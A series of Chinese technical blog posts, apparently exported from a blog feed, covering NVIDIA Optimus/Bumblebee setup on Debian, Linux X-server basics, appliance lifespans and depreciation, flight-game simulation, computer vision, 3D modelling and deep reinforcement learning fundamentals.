    <content type="text"><![CDATA[购买笔记本拥有Intel集成显卡和NVIDIA显卡，如何在Debian Linux下启用NVIDIA显卡是一个难题。幸运的是，通过bumblebee软件可在Linux下支持NVIDIA Optimus技术，实现Intel集成显卡和NVIDIA显卡之间的切换使用。 背景知识NVIDIA OptimusOptimus是NVIDIA针对笔记本电脑的显示切换技术。它可以实现笔记本电脑中独立显卡与主板内置显卡之间无缝、自动、实时的切换（用户无需重启或手动调整），从而实现能源的节约。 利用Optimus技术后，计算机的显示输出永远都只会通过集成式芯片组的显示核心。独立显卡的显示输出将会被废掉，有关的输出亦会发送到前者。由于显示输出的设备是固定的，所以黑屏现象将会被解决。额外的切换线路亦变得不需要，因为在不需要独立显示核心的时候，系统会索性断绝其电源供应。当系统的显示负载轻的时候，就会完全利用内置的显示核心。当负载增加后，系统就会打开独立显示核心作计算之用。协议分工方面由驱动程序负责，NVIDIA声称可以兼容所有的API。 BumblebeeBumblebee 致力于使 NVIDIA Optimus 在 GNU/Linux 系统上可用，实现两块不同的供电配置的显卡同时插入使用，共享同一个 framebuffer。 安装配置过程禁止加载开源驱动nouveau12345678$ vi /etc/modprobe.d/nvidia-installer-disable-nouveau.conf#上述文件不存在则新建，在文件中添加下面两行文字blacklist nouveauoptions nouveau modeset = 0#系统重启后使用以下命令查看nouveau驱动是否被禁止lsmod |grep -i nouveau 安装内核头文件1$ sudo apt-get install -y linux-headers-$(uname -r) 安装NVIDIA驱动12# 关于是否生存xorg.conf文件，选no$ sudo apt-get install nvidia-driver nvidia-xconfig nvidia-kernel-dkms 安装双显卡切换解决方案包1$ apt-get install bumblebee-nvidia primus 添加当前用户到bumblebee用户组1$ adduser $USER bumblebee 修改bumblebee配置123456789101112$ vi /etc/bumeblebee/bumblebee.conf: Driver=nvidia#将/etc/bumeblebee/bumblebee.conf文件中的Driver=* 改成 =nvidia$ vi /etc/bumblebee/xorg.conf.nvidia:BusID &quot;PCI:01:00:0&quot; #在/etc/bumblebee/xorg.conf.nvidia文件中，将Section“Device”部分添加PCI ID# 可使用如下命令查看NVIDIA显卡的BUS IDnvidia-xconfig --query-gpu-info | grep &apos;BusID : &apos; | cut -d &apos; &apos; -f6 重启进入桌面如果无法进入桌面环境，则安装失败，进入高级修复使用如下命令进行清理。1$ sudo apt-get purge nvidia* bumblebee* prime* bumblebee服务开机不会启动，设置开机启动即可。1$ update-rc.d -f bumblebee defaults 使用独显运行程序bumblebee不能做到集显和独显之间自动切换，系统运行时默认使用集显，当你需要使用独显运行某个程序或者游戏的时候，终端执行如下命令即可：12$ optirum command #使用独显运行command程序$ optirum -b primus command #使用独显运行command程序，提升性能 参考链接 kali 在支持双显卡切换机器宏碁（Acer）V3下安装NVIDIA驱动, by 不梦君. Installing-Nvidia-drivers-on-Kali-Linux, by europa502. NVIDIA Optimus, by wikipedia. 在Ubuntu上安装和配置Nvidia Optimus驱动, by Linux中国. Bumblebee),by archlinux.]]></content>
      <tags>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux图形界面基础知识]]></title>
    <url>%2F2018%2F12%2F09%2FLinux%E5%9B%BE%E5%BD%A2%E7%95%8C%E9%9D%A2%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%2F</url>
    <content type="text"><![CDATA[Linux初学者经常分不清楚linux和X之间，X和Xfree86之间，X和KDE，GNOME等之间是什么关系。常常混淆概念，下面以易于理解的方式解释X，X11，XFREE，WM，KDE，GNOME等之间的关系。 Linux内核没有图形用户界面与Windows操作系统内核集成图形用户界面不同，Linux内核没有图形用户界面，是一个基于命令行的操作系统。 linux和Xfree的关系就相当于当年的DOS和 WINDOWS3.0一样，windows3.0不是独立的操作系统，它只是DOS的扩充，是DOS下的应用程序级别的系统，不是独立的操作系统，同样 XFree只是linux下的一个应用程序而已。不是系统的一部分，但是X的存在可以方便用户使用电脑。 WINDOWS95及以后的版本就不一样了，他们 的图形界面是操作系统的一部分，图形界面在系统内核中就实现了，没有了图形界面windows就不成为windows了，但linux却不一样，没有图形 界面linux还是linux，很多装linux的WEB服务器就根本不装X服务器.这也WINDOWS和linux的重要区别之一。 X是协议，不是具体的某个软件X 是协议，就像HTTP协议，IP协议一样。一个基于X的应用程序需要运行并显示内容时他就联 接到X服务器，开始用X协议和服务器交谈。 比如一个X应用程序要在屏幕上输出一个圆那么他就用X协议对X服务器说：喂!我需要在屏幕上画一个圆.X应用程 序只负责告诉X服务器在屏幕的什么地方用什么颜色画一个多大的圆，而具体的”画”的动作，比如这个圆如何生成，用什么显卡的驱动程序去指挥显卡完成等等工作是由X服务器来完成的。 X服务器还负责捕捉键盘和鼠标的动作，假设X服务器捕捉到鼠标的左键被按下了，他就告诉X应用程序：亲爱的应用程序先生，我发现 鼠标被按下了，您有什么指示吗?如果X应用程序被设计成当按下鼠标左健后再在屏幕上画一个正方形的话，X应用程序就对X服务器说：请再画一个正方形，当然 他会告诉服务器在什么地方用什么颜色画多大的正方形，但不关心具体怎么画—那是服务器的事情。 XFree86和Xorg是实现X协议的服务器程序Xfree86就是这样一个去根据法规实现协议的 “交警”。他按照X协议的规定来完成X应用程序提交的在屏幕上显示的任务。当然不仅仅是某个特定的交警才可以去维护和实现这个法规，比如还可以由交通协管 员来实现交通法规，必要的时候警察也可以介入，当然前提是他们都要懂得交通法规，也就是要懂得协议。 所以实现X协议的软件也并不只有 XFree86，XFree86只是实现X协议的一个免费X服务器软件.商业上常用MOTIF，现在还有XORG，还有很多很小的由爱好者写的小的X服务器软件。 X和X11R6的关系X11R6 实际上是 X Protocol version 11 Release 6(X协议第11版第六次发行)的意思，就是说目前用的X协议是第11版的，然后经过了6次小的修正。 不同版本的X协议是不能通信的。就象我们现在IPV4和IPV6不能通信一样，不过不用担心，现在的X服务器软件和X应用程序都遵循X11R6。 X服务器和WM(window manager 窗口管理器)的关系 窗口管理器是一种X应用程序，它负责窗口最大化，最小化，移动，关闭窗口等。这些不是X服务器负责完成的。 KDE和GNOMEKDE 和GNOME是LINUX里最常用的图形界面操作环境，他们不仅仅是一个窗口管理器那么简单， KDE是K Desktop Environment 的缩写。他不仅是一个窗口管理器，还有很多配套的应用软件和方便使用的桌面环境，比如任务栏，开始菜单，桌面图标等等。 GNOME是GNU Network Object Model Environment 的缩写。和KDE一样，也是一个功能强大的综合环境。 另外在其它UNIX系统中，常常使用CDE作为这样一个环境。 其它的小型窗口管理器有: window maker，after step，blackbox，fvwm，fvwm2，等等都是常用的优秀窗口管理器。 linux图形界面层次关系总结linux本身—&gt;X服务器&lt;-[通过X协议交谈]-&gt;窗口管理器(综合桌面环境)—&gt;X应用程序。 Xfree86服务器的实现包括两个部分，一部分是和显卡直接打交道的低层，一部分是和X应用程序打交道的上层。 上层负责接收应用程序的请求和鼠标 键盘的动作。而和显卡直接打交道的底层负责指挥显卡生成图形，其实就是显卡驱动。上层接收到应用程序的请求后，将请求内容做适当处理，然后交给显卡驱动来 指挥 显卡完成画图的动作。 另外，上层的捕捉键盘和鼠标动作的部分会向应用程序提供鼠标和键盘的状态信息，应用程序接收到这些信息后决定是否再有相应的动作。 参考链接 linux图形界面基本知识(X、X11、Xfree86、Xorg、GNOME、KDE), by huang_xw.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[家用电器安全使用年限与折旧]]></title>
    <url>%2F2018%2F12%2F08%2F%E5%AE%B6%E7%94%A8%E7%94%B5%E5%99%A8%E5%AE%89%E5%85%A8%E4%BD%BF%E7%94%A8%E5%B9%B4%E9%99%90%E4%B8%8E%E6%8A%98%E6%97%A7%2F</url>
    <content type="text"><![CDATA[家用电器都有一定的安全使用年限，超过安全使用年限，家用电器因产品老化将产生如下问题，造成安全隐患： 绝缘体老化，产生漏电，导致电磁污染 元器件技术指标严重下降，导致有害物质泄漏，耗电量增加 那么家用电器的安全使用年限是多少呢？购买二手家用电器时如何折旧呢？ 家用电器安全使用年限有关家电安全使用年限的标准通则早已出台，但是针对不同产品的具体年限细则却迟迟未发布。原因主要在于不同产品的使用年限评估难度较大，不同地区的使用差异性也较大，因此就目前而言国内尚无明确的家电使用年限方面的规定，国际通行年限可作参考： 电吹风：4年 电热毯：6年 电脑：6年 吸尘器：8年 煤气灶：8年 电热水器：8年 洗衣机：8年 电视：8-10年 空调：8-10年 微波炉：10年 电饭煲：10年 电风扇：10年 冰箱：12-16年 家用电器安全使用年限只是最高限定，如果在使用过程中不注意保养维护，也有可能缩减家用电器的使用寿命，这就要求用户在日常生活中需要注重维护保养，使家电处于良好的工作环境，确保家电安全“服役”。 家用电器老化特征家用电器也有各自的老化特征，当出现以下老化特征时，建议及时保养或更换： 空调：如果使用多年的空调开始出现制冷或制热变慢，噪音过大，在开机时会出现霉味且出风伴有灰尘，流出黑水，那么用户就应该考虑更换一台新空调。老旧空调此时不仅耗费更多电量，出风还会带有细菌污垢，影响身体健康。 冰箱：平时运行良好的冰箱开始出现制冷效果差，噪音过大，甚至发生轻微颤动时，说明已经老化。若继续使用，耗电量将会加大，食物的储鲜功能也会退化，有时还会出现冰箱制冷剂泄露，污染食材环境的问题。 洗衣机：洗衣机使用超龄的现象在用户中最为常见，判断它已经超龄的方式也最为简单。通常来说，洗衣机出现渗水、漏水、漏电，噪音过大，衣物清洗不净等问题都是达到使用年限的表现，严重时甚至会发生爆炸事件。 电视机：虽然各种类型的平板、投影仪的市场占有率越来越高，但电视机仍然是每个家庭不可或缺的电器之一。日常使用电视时，屏幕色彩暗淡，画面模糊抖动，除了要考虑电视自身质量问题，还要查看电视使用时长是否已经超出使用年限。超龄服役的电视机除了耗电量增加外，自燃或爆炸事故也时有发生。 热水器：热水器超出使用年限后，在运行时会出现异常声音，安全装置也会发生功能异常问题，再加上内胆中日积月累的杂质污垢，不仅会污染水质，还可能因漏电对人体造成伤害。除此之外，超龄热水器还易出现漏水、保温性差以及因内部电器元件老化导致的短路、冒烟等故障。 一旦发现家中电器存在以上类似的老化特征时，最好提前更换产品，以免带来严重后果。据媒体公开报道，每年我国因家电触电伤亡人数超过1000人，因家电引起的火灾损失更加惊人，而这其中最典型的原因就是家电超龄“使用”。 家用电器折旧家用电器折旧可简单按固定资产折旧方法中的直线法，根据家用电器安全使用年限逐年折旧。 固定资产折旧方法固定资产折旧方法（Fixed-assets Depreciation Method），指将应提折旧总额在固定资产各使用期间进行分配时所采用的具体计算方法。折旧是指固定资产由于使用而逐渐磨损所减少的那部分价值。 固定资产的损耗有两种： 有形损耗，也称作物质磨损，是由于使用而发生的机械磨损，以及由于自然力的作用所引起的自然损耗。 无形损耗，也称精神磨损，是指科学进步以及劳动生产率提高等原因而引起的固定资产价值的损失。 一般情况下，当计算固定资产折旧时，要同时考虑这两种损耗。 固定资产折旧方法可分为三类： 直线法直线法（straight-line method）根据固定资产在整个使用寿命中的磨损状态而确定的成本分配结构。直线法依据是，固定资产的使用强度比较平均，而且各期所取得的收入差距不大。在直线法下，折旧金额是时间的线性函数。 直线法折旧公式如下： 年折旧率 = （1 － 预计净残值率）÷ 预计使用寿命（年）× 100% 月折旧额 = 固定资产原价× 年折旧率 ÷ 12 其中，净残值是指预计固定资产清理报废时可收回的残值扣除清理费用后的数额。企业应根据固定资产的性质和使用方式，合理估计固定资产的净残值。 加速折旧法加速折旧法也称为快速折旧法或递减折旧法。其特点是：在固定资产有效使用年限的前期多提折旧，后期则少提折旧。从而相对加快折旧的速度，以使固定资产成本在有效使用年限中加快得到补偿。在具体实务中，加速折旧方法又包括年数总和法和双倍余额递减法两种。 年数总和法计算公式如下： 年折旧率 = 尚可使用寿命/ 预计使用寿命的年数总和 × 100 % 月折旧额 = （固定资产原价 － 预计净残值 ）× 年折旧率 ÷ 12 某设备预计使用5年，则预计使用寿命的年数总和为15（5+4+3+2+1）。第2年时尚可使用寿命为4，此年的年折旧率为4/15。 双倍余额递减法计算公式如下： 年折旧率 =2÷ 预计使用寿命（年）× 100% 月折旧额 = 固定资产净值 × 年折旧率 ÷ 12 产量法产量法（production method）根据固定资产的产出量分配其成本的方法。产量法的依据是固定资产的使用寿命主要是受其使用量影响，其合理性取决于三个条件： （1）固定资产的每期用量波动较大； （2）固定资产使用期内的产出的每期用量波动较大； （3）固定资产服务潜力的下降与其使用程序密切相关。 如果符合这三个条件，产量法是最符合配比原则的。反对产量法的人认为，估计固定资产的产出量比估计固定资产的使用年限更加困难，而且很难考虑功能损耗因素。 产量法计算公式如下： 单位工作量折旧额 = 固定资产原价 × （ 1 － 预计净残值率 ）/ 预计总工作量 某项固定资产月折旧额 = 该项固定资产当月工作量 × 单位工作量折旧额 参考链接 家用电器的使用年限是多久？如何尽可能延长其寿命？,by 海尔智慧生活. 固定资产折旧方法,by 百度百科.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>生活常识</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[空战类游戏仿真的一些思考]]></title>
    <url>%2F2018%2F12%2F08%2F%E7%A9%BA%E6%88%98%E7%B1%BB%E6%B8%B8%E6%88%8F%E4%BB%BF%E7%9C%9F%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%9D%E8%80%83%2F</url>
    <content type="text"><![CDATA[空战类游戏仿真涉及飞机、导弹、诱饵弹三种关键元素。为了使游戏仿真接近真实，一方面要使飞机、导弹、诱饵弹的模型及其特效（如尾焰）尽量逼真，另一方面要使飞机、导弹、诱饵弹的运动控制模型尽量接近真实。飞机、导弹、诱饵弹的模型可以用3d建模软件构建，尾焰也可以用粒子系统进行模拟，但飞机、导弹、诱饵弹的运动控制模型比较复杂，是实现空战类游戏仿真的关键。下面分别介绍飞机、导弹、诱饵弹的建模仿真。 飞机的建模仿真飞机的运动模型基于牛顿第二运动定律，即物体所受到的外力等于此物体的质量与加速度的乘积，而加速度与外力同方向。根据外部受力和力矩计算出各种惯性坐标系下的加速度和角加速度。将加速度和角加速度分别进行积分，则可以得出飞机在某个时间段内的速度变化量和角速度变化量，进一步积分便可得到位置变化量和角度的变化量，再通过积分过程中的坐标变换以及初始时刻的状态参数，便可获得任意时刻飞机的姿态、位置、速度等参数。 飞行员通过油门杆和操纵杆控制飞机的运动。油门杆决定飞机的推力，操纵杆则控制飞机的副翼、襟翼、尾翼，改变飞机所受合力矩，从而改变飞机姿态。飞行仿真采用同样原理，油门杆和操作杆的位移经过非线性函数变换改变飞机所受合力和合力矩，经飞机运动模型获得加速度和角加速度，再经积分获得任意时刻飞机的姿态、位置、速度等参数。 当使用键盘输入控制飞机时，应将键盘输入先虚拟成油门杆和操作杆。另外需要注意的是，油门杆不回中，操作杆则自动回中。 导弹的建模仿真根据导弹的工作原理，导弹的建模仿真应分成三个方面： 探测模型 目标识别算法 运动控制模型 诱饵弹的建模仿真诱饵弹的运动模型比较简单，可运用牛顿第二运动定律分析得出。比较有难度的是诱饵弹的视觉特效建模。诱饵弹是一个变质量、不规则的发光体，如何3D建模有难度，不能像太阳一样直接用图片代替。 参考链接 无人机飞控通俗演义之 纷繁复杂的飞行力学, by 量子黑洞. 一起写飞行仿真之 六自由度动力学方程, by 量子黑洞. 飞行仿真—1.三维建模篇, by WFYX. 无人机飞控通俗演义之 无人机导航制导与控制, by WFYX. FLIGHTGEAR FLIGHT SIMULATOR, by flightgear.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>3D</tag>
        <tag>计算机仿真</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[计算机视觉研究范畴简介]]></title>
    <url>%2F2018%2F12%2F07%2F%E8%AE%A1%E7%AE%97%E6%9C%BA%E8%A7%86%E8%A7%89%E7%A0%94%E7%A9%B6%E8%8C%83%E7%95%B4%E7%AE%80%E4%BB%8B%2F</url>
    <content type="text"><![CDATA[计算机视觉是一个跨领域的交叉学科，包括计算机科学（图形、算法、理论、系统、体系结构），数学（信息检索、机器学习），工程学（机器人、语音、自然语言处理、图像处理），物理学（光学 ），生物学（神经科学）和心理学（认知科学）等等。那么什么是计算机视觉呢？这里给出了几个比较严谨的定义： “对图像中的客观对象构建明确而有意义的描述”（Ballard＆Brown，1982） “从一个或多个数字图像中计算三维世界的特性”（Trucco＆Verri，1998） “基于感知图像做出对客观对象和场景有用的决策”（Sockman＆Shapiro，2001） 研究范畴视觉识别是计算机视觉的关键组成部分，如图像分类、定位和检测。神经网络和深度学习的最新进展极大地推动了这些最先进的视觉识别系统的发展。下面介绍 5 种主要的计算机视觉技术： 图像分类 给定一组各自被标记为单一类别的图像，我们对一组新的测试图像的类别进行预测，并测量预测的准确性结果，这就是图像分类问题。图像分类问题需要面临以下几个挑战： 视点变化，尺度变化，类内变化，图像变形，图像遮挡，照明条件和背景杂斑 对象检测 识别图像中的对象这一任务，通常会涉及到为各个对象输出边界框和标签。这不同于分类/定位任务——对很多对象进行分类和定位，而不仅仅是对个主体对象进行分类和定位。在对象检测中，你只有 2 个对象分类类别，即对象边界框和非对象边界框。例如，在汽车检测中，你必须使用边界框检测所给定图像中的所有汽车。 目标跟踪 目标跟踪，是指在特定场景跟踪某一个或多个特定感兴趣对象的过程。传统的应用就是视频和真实世界的交互，在检测到初始对象之后进行观察。现在，目标跟踪在无人驾驶领域也很重要，例如 Uber 和特斯拉等公司的无人驾驶。 语义分割 计算机视觉的核心是分割，它将整个图像分成一个个像素组，然后对其进行标记和分类。特别地，语义分割试图在语义上理解图像中每个像素的角色（比如，识别它是汽车、摩托车还是其他的类别）。 实例分割 除了语义分割之外，实例分割将不同类型的实例进行分类，比如用 5 种不同颜色来标记 5 辆汽车。分类任务通常来说就是识别出包含单个对象的图像是什么，但在分割实例时，我们需要执行更复杂的任务。我们会看到多个重叠物体和不同背景的复杂景象，我们不仅需要将这些不同的对象进行分类，而且还要确定对象的边界、差异和彼此之间的关系！ 典型应用计算机视觉领域已经衍生出了一大批快速成长的、有实际作用的应用，例如： 人脸识别： Snapchat 和 Facebook 使用人脸检测算法来识别人脸。 图像检索：Google Images 使用基于内容的查询来搜索相关图片，算法分析查询图像中的内容并根据最佳匹配内容返回结果。 游戏和控制：使用立体视觉较为成功的游戏应用产品是：微软 Kinect。 监测：用于监测可疑行为的监视摄像头遍布于各大公共场所中。 生物识别技术：指纹、虹膜和人脸匹配仍然是生物识别领域的一些常用方法。 智能汽车：计算机视觉仍然是检测交通标志、灯光和其他视觉特征的主要信息来源。 前沿研究 超分辨率重建 (Image Super-Resolution) 图像着色 (Image Colorization) “看图说话” (Image Caption) 人像复原 (Sketch Inversion) 图像自动生成 参考文献 详解计算机视觉五大技术：图像分类、对象检测、目标跟踪、语义分割和实例分割…, by AI科技大本营 「无中生有」计算机视觉探奇, by 魏秀参]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>计算机视觉</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[三维建模方法简介]]></title>
    <url>%2F2018%2F12%2F05%2F%E4%B8%89%E7%BB%B4%E5%BB%BA%E6%A8%A1%E6%96%B9%E6%B3%95%E7%AE%80%E4%BB%8B%2F</url>
    <content type="text"><![CDATA[三维建模是一种常用技术，奈何心向往之，却没有时间去系统学习，也没有做出过一个作品。下面将我看到的一些好的有关三维建模的资料记录一下，以做备忘。 三维建模方法选择软件当前三维软件层出不穷，既有商业级的3ds MAX、MAYA、Creator，也有免费使用的Blender、MilkShape。 下载蓝图飞行仿真的三维模型主要有飞行器、机场建筑等。和大多数虚拟现实中使用的模型一样，并不需要CAD级别的精度，一般是下载一些图片或飞机整体蓝图作为蓝本，采用多边形建模的方法分部建模。蓝图下载网址首推： the‑blueprints.com 这里免费提供各种汽车、国内外飞机、船舶的三视图图纸下载。 多边形建模采用下载的蓝图，作为贴图放置在相应的投影平面上，然后采用多边形建模的方法画出各部分细节。多边形建模的思想就是采用一个诸如一个最接近的多边形，进行点线面的操作就可以绘制出复杂的飞机外形。 多边形建模从最基本的外形开始变形，可以从点线面及整体四个级别的操作，在越需要突出外形细节处用越多的点，通过建立网格模型，然后使用网格平滑功能生成平滑的曲面模型。 建模时不能有重复的点线面等几何体，否则即使表面上已经贴好了材质，但载入程序后，往往会因为Z向深度冲突的原因产生闪烁效果。其细节取决于您的需求，需要花费大量的时间。 贴图真实世界的模型带有各种彩色并具有光泽度。完成了几何体的建模对于一个模型来说只完成了一小半工作，还需要给模型添加材质。 与一般的模型不同，飞行器出于气动设计的考虑，其表面模型一般成流线型的曲面，且部件组成复杂，界线较难区分，即使是UVW贴图也难以胜任。因此，对飞行器的贴图主要采用3ds MAX的UVW展开贴图技术贴图。 一个模型最好只有一个贴图，因为贴图数目过多零散会影响计算机载入三维模型时间和效率。因此，一般将整个模型各个部件组合为一个多边形，各部件为元素，待完成UVW贴图后再分离成单独的部件。UVW展开贴图有多重形式，如长方体展开（即按六个视图投影）、平面展开等，按需选择。 在一张贴图上展开整个模型的UV坐标显然是有限的，需要根据现实精度调整各个部分的贴图大小。保存这些展开的贴图坐标并渲染输出UV模板图像文件。UV模板图像其实就是整个模型的贴图的界线图像，通过Photoshop等图像处理软件处理，采用尽可能真实的图像放置在对应的区域。最后将材质赋给对象即完成贴图渲染。 数据导出直接采用3ds MAX绘制的三维模型当然是.max格式，它不能为外界程序读取。这时就需要根据自己的开发环境选择导出的数据格式，比如用开源的OSG做仿真开发，就需要OSGExp插件的支持，导成.ive、.osg、.osgb等格式即可。但无论导出何种格式，切记保证模型质心与建模的原点不能相差不远，还要注意光照、贴图格式以及单位问题。 参考链接 飞行仿真—1.三维建模篇,by WFYX.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>3D</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[深度强化学习研究笔记]]></title>
    <url>%2F2018%2F11%2F26%2F%E6%B7%B1%E5%BA%A6%E5%BC%BA%E5%8C%96%E5%AD%A6%E4%B9%A0%E7%A0%94%E7%A9%B6%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[深度强化学习Deep Reinforcement Learning是将深度学习与强化学习结合起来，从而实现从Perception感知到Action动作的端对端学习End-to-End Learning的一种全新的算法。深度强化学习具备使机器人实现真正完全自主地学习一种甚至多种技能的潜力。 深度强化学习的起源深度强化学习是深度学习与强化学习相结合的产物。 深度学习深度学习（deep learning）是机器学习的分支，是一种试图使用包含复杂结构或由多重非线性变换构成的多个处理层对数据进行高层抽象的算法。 深度学习是机器学习中一种基于对数据进行表征学习的算法。观测值（例如一幅图像）可以使用多种方式来表示，如每个像素强度值的向量，或者更抽象地表示成一系列边、特定形状的区域等。而使用某些特定的表示方法更容易从实例中学习任务（例如，人脸识别或面部表情识别）。深度学习的好处是用非监督式或半监督式的特征学习和分层特征提取高效算法来替代手工获取特征。 表征学习的目标是寻求更好的表示方法并创建更好的模型来从大规模未标记数据中学习这些表示方法。表示方法来自神经科学，并松散地创建在类似神经系统中的信息处理和对通信模式的理解上，如神经编码，试图定义拉动神经元的反应之间的关系以及大脑中的神经元的电活动之间的关系。 至今已有数种深度学习框架，如深度神经网络、卷积神经网络和深度置信网络和递归神经网络已被应用在计算机视觉、语音识别、自然语言处理、音频识别与生物信息学等领域并获取了极好的效果。 另外，“深度学习”已成为类似术语，或者说是神经网络的品牌重塑。 深度神经网络深度神经网络是一种具备至少一个隐层的神经网络。与浅层神经网络类似，深度神经网络也能够为复杂非线性系统提供建模，但多出的层次为模型提供了更高的抽象层次，因而提高了模型的能力。 深度神经网络（Deep Neural Networks, DNN）是一种判别模型，可以使用反向传播算法进行训练。权重更新可以使用下式进行随机梯度下降法求解： \Delta w_{ij}(t+1)=\Delta w_{ij}(t) + \eta\frac{\partial C}{\partial w_{ij}}其中，$\eta$为学习率，$C$为代价函数。这一函数的选择与学习的类型（例如监督学习、无监督学习、增强学习）以及激活函数相关。例如，为了在一个多分类问题上进行监督学习，通常的选择是使用ReLU作为激活函数，而使用交叉熵作为代价函数。Softmax函数定义为${\displaystyle p{j}={\frac {\exp(x{j})}{\sum {k}\exp(x{k})}}}$，其中 ${\displaystyle p{j}}$代表类别 ${\displaystyle j}$的概率，而 ${\displaystyle x{j}}$和 ${\displaystyle x{k}}$分别代表对单元 ${\displaystyle j}$ 和 ${\displaystyle k}$的输入。交叉熵定义为 $C = -\sum_j d_j \log(p_j)$ ，其中 ${\displaystyle d{j}}$代表输出单元${\displaystyle j}$的目标概率， ${\displaystyle p_{j}}$代表应用了激活函数后对单元 ${\displaystyle j}$的概率输出。 强化学习在人工智能领域，一般用智能体Agent表示一个具备行为能力的物体，比如机器人，无人车等等。而强化学习则研究智能体Agent和环境Environment之间交互过程如何取得任务的成功。 强化学习与环境的交互过程如图1所示。在某个时间点，智能体Agent会获得观察值(Observation)和反馈值(Reward)，然后根据这些选择下一步的动作(Action)。 图1 强化学习示意图 在整个过程中，任务的目标是获取尽可能多的Reward，这是任务的目标。而在每个时间片，Agent都是根据当前的观察来确定下一步的动作。观察Observation的集合就作为Agent的所处的状态State，因此，状态State和动作Action存在映射关系，也就是一个state可以对应一个action，或者对应不同动作的概率（常常用概率来表示，概率最高的就是最值得执行的动作）。状态与动作的关系其实就是输入与输出的关系，而状态State到动作Action的过程就称之为一个策略Policy，一般用 $\pi$ 表示，也就是需要找到以下关系： a=\pi(s)或者 \pi(a|s)其中a是action，s是state。第一种是一一对应的表示，第二种是概率的表示。1强化学习的任务就是找到一个最优的策略Policy从而使Reward最多。 强化学习的训练一开始从采用随机策略进行试验开始，可获得一系列的状态,动作和反馈： \{s_1,a_1,r_1,s_2,a_2,r_2,...,s_t,a_t,r_t\}根据这一系列样本，强化学习从中改进策略，使得任务反馈Reward越来越多。 强化学习模型假设强化学习的研究建立在经典物理学基础上，基于以下两种假设： 时间是可以分割成一个一个时间片的，并且有完全的先后顺序。 上帝不掷筛子！如果输入是确定的，那么输出也一定是确定的。 强化学习与马尔科夫决策过程MDP基于这样一种假设：未来只取决于当前。 一个状态$S_t$是Markov当且仅当 P(s_{t+1}|s_t)=P(s_{t+1}|s_t,s_{t-1},...s_1,s_0)P为概率。简单的说就是下一个状态仅取决于当前的状态和当前的动作。注意这里的状态是完全可观察的全部的环境状态（也就是上帝视角）。 增强学习的问题都可以模型化为MDP的问题。 一个基本的MDP可以用（S,A,P）来表示，S表示状态，A表示动作，P表示状态转移概率，也就是根据当前的状态$st$和$a_t$转移到$s{t+1}$的概率。如果我们知道了转移概率P，也就是称为我们获得了模型Model，有了模型，未来就可以求解，那么获取最优的动作也就有可能，这种通过模型来获取最优动作的方法也就称为Model-based的方法。但是现实情况下，很多问题是很难得到准确的模型的，因此就有Model-free的方法来寻找最优的动作。 强化学习的回报Result既然一个状态对应一个动作，或者动作的概率，而有了动作，下一个状态也就确定了。这就意味着每个状态可以用一个确定的值来进行描述。可以由此判断一个状态是好的状态还是不好的状态。 状态的好坏其实等价于对未来回报的期望。因此，引入回报Return来表示某个时刻t的状态将具备的回报： G_t = R_{t+1} + \lambda R_{t+2} + ... = \sum_{k=0}^\infty\lambda^kR_{t+k+1}上面R是Reward反馈，λ是discount factor折扣因子，一般小于1，就是说一般当下的反馈是比较重要的，时间越久，影响越小。 那么实际上除非整个过程结束，否则显然我们无法获取所有的reward来计算出每个状态的Return，因此，再引入一个概念价值函数Value Function,用value function $v(s)$来表示一个状态未来的潜在价值。 从定义上看，value function就是回报的期望： v(s) = \mathbb E[G_t|S_t = s]引出价值函数，对于获取最优的策略Policy这个目标，我们就会有两种方法： 直接优化策略$\pi(a|s)$或者$a = \pi(s)$使得回报更高 通过估计value function来间接获得优化的策略。道理很简单，既然我知道每一种状态的优劣，那么我就知道我应该怎么选择了，而这种选择就是我们想要的策略。 把值函数展开： \begin{aligned} v(s) & = \mathbb E[G_t|S_t = s] \\\\ & = \mathbb E[R_{t+1}+\lambda R_{t+2} + \lambda ^2R_{t+3} + ...|S_t = s] \\\\ & = \mathbb E[R_{t+1}+\lambda (R_{t+2} + \lambda R_{t+3} + ...)|S_t = s] \\\\ & = \mathbb E[R_{t+1} + \lambda G_{t+1}|S_t = s] \\\\ & = \mathbb E[R_{t+1} + \lambda v(S_{t+1})|S_t = s] \end{aligned}因此： v(s) = \mathbb E[R_{t+1} + \lambda v(S_{t+1})|S_t = s]上面这个公式就是Bellman方程的基本形态。从公式上看，当前状态的价值和下一步的价值以及当前的反馈Reward有关。它表明Value Function是可以通过迭代来进行计算的!!! Action-Value function 动作价值函数前面我们引出了价值函数，考虑到每个状态之后都有多种动作可以选择，每个动作之下的状态又多不一样，我们更关心在某个状态下的不同动作的价值。显然。如果知道了每个动作的价值，那么就可以选择价值最大的一个动作去执行了。这就是Action-Value function $Q^\pi(s,a)$。那么同样的道理，也是使用reward来表示，只是这里的reward和之前的reward不一样，这里是执行完动作action之后得到的reward，之前state对应的reward则是多种动作对应的reward的期望值。显然，动作之后的reward更容易理解。 动作价值函数就为如下表示： \begin{aligned} Q^\pi(s,a) & = \mathbb E[r_{t+1} + \lambda r_{t+2} + \lambda^2r_{t+3} + ... |s,a] \\\\ & = \mathbb E_{s^\prime}[r+\lambda Q^\pi(s^\prime,a^\prime)|s,a] \end{aligned}这里要说明的是动作价值函数的定义，加了$\pi$,也就是说是在策略下的动作价值。因为对于每一个动作而已，都需要由策略根据当前的状态生成，因此必须有策略的支撑。而前面的价值函数则不一定依赖于策略。当然，如果定义$v^\pi(s)$则表示在策略$\pi$下的价值。 Optimal value function 最优价值函数能计算动作价值函数是不够的，因为我们需要的是最优策略，现在求解最优策略等价于求解最优的value function，找到了最优的value function，自然而然策略也就是找到。（当然，这只是求解最优策略的一种方法，也就是value-based approach，由于DQN就是value-based，因此这里只讲这部分，以后我们会看到还有policy-based和model-based方法。一个就是直接计算策略函数，一个是估计模型，也就是计算出状态转移函数，从而整个MDP过程得解） 这里以动作价值函数来分析。 